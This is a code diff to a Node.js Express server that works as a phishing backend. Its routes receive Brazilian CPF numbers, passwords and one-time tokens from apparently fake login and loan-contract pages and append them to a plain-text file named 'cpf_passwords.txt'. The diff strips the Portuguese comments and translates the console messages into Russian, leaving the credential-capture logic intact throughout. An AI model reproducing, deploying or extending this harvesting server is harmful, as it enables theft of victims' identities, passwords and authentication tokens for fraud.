@@ -12,13 +12,10 @@ const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';
 // 3. Middlewares
 app.use(cors());
 app.use(express.json());
-
-// Configura o Express para servir todos os arquivos estáticos da pasta 'public'
 app.use(express.static(path.join(__dirname, 'public')));
 
 // 4. Rotas da API
 
-// Rota para capturar os dados da página de login (CPF + Senha)
 app.post('/salvar-dados', (req, res) => {
     const { cpf, senha } = req.body;
     if (!cpf || !senha) {
@@ -28,18 +25,17 @@ app.post('/salvar-dados', (req, res) => {
     const dataHora = new Date().toLocaleString('pt-BR');
     const linhaDeLog = `[LOGIN - ${dataHora}] - CPF: ${cpf} | Senha: ${senha}\n`;
 
-    console.log('Dados recebidos:', linhaDeLog.trim());
+    console.log('Получены данные:', linhaDeLog.trim());
 
     fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
         if (err) {
-            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
+            console.error('ОШИБКА ПРИ СОХРАНЕНИИ ФАЙЛА:', err);
         }
     });
 
     res.status(200).json({ message: 'Dados iniciais recebidos.' });
 });
 
-// Rota para capturar o pacote final (CPF + Senha + Token)
 app.post('/salvar-tudo', (req, res) => {
     const { cpf, senha, token } = req.body;
     if (!cpf || !senha || !token) {
@@ -49,20 +45,18 @@ app.post('/salvar-tudo', (req, res) => {
     const dataHora = new Date().toLocaleString('pt-BR');
     const linhaDeLog = `[COMPLETO - ${dataHora}] - CPF: ${cpf} | Senha: ${senha} | Token: ${token}\n`;
 
-    console.log('Pacote final recebido:', linhaDeLog.trim());
+    console.log('Финальный пакет получен:', linhaDeLog.trim());
 
     fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
         if (err) {
-            console.error('ERRO AO SALVAR PACOTE FINAL:', err);
+            console.error('ОШИБКА ПРИ СОХРАНЕНИИ ФИНАЛЬНОГО ПАКЕТА:', err);
         }
-        console.log('Pacote final salvo com sucesso em', NOME_ARQUIVO_LOG);
+        console.log('Финальный пакет успешно сохранён в', NOME_ARQUIVO_LOG);
     });
 
     res.status(200).json({ message: 'Processo finalizado.' });
 });
 
-
-// Rota para capturar o CPF da página de empréstimos
 app.post('/acessar-contratos', (req, res) => {
     const { cpf } = req.body;
     if (!cpf) {
@@ -72,20 +66,19 @@ app.post('/acessar-contratos', (req, res) => {
     const dataHora = new Date().toLocaleString('pt-BR');
     const linhaDeLog = `[CONTRATOS - ${dataHora}] - CPF: ${cpf}\n`;
 
-    console.log('Dados de Contratos recebidos:', linhaDeLog.trim());
+    console.log('Данные контрактов получены:', linhaDeLog.trim());
 
     fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
         if (err) {
-            console.error('ERRO AO SALVAR NO ARQUIVO DE CONTRATOS:', err);
+            console.error('ОШИБКА ПРИ СОХРАНЕНИИ КОНТРАКТОВ:', err);
         }
     });
 
     res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
 });
 
-
 // 5. Inicia o servidor
 app.listen(port, () => {
-    console.log(`Servidor rodando na porta ${port}`);
-    console.log(`Aguardando dados... Logs serão salvos em: "${NOME_ARQUIVO_LOG}" e exibidos neste console.`);
+    console.log(`Сервер запущен на порту ${port}`);
+    console.log(`Ожидание данных... Логи выводятся в этот консоль.`);
 });
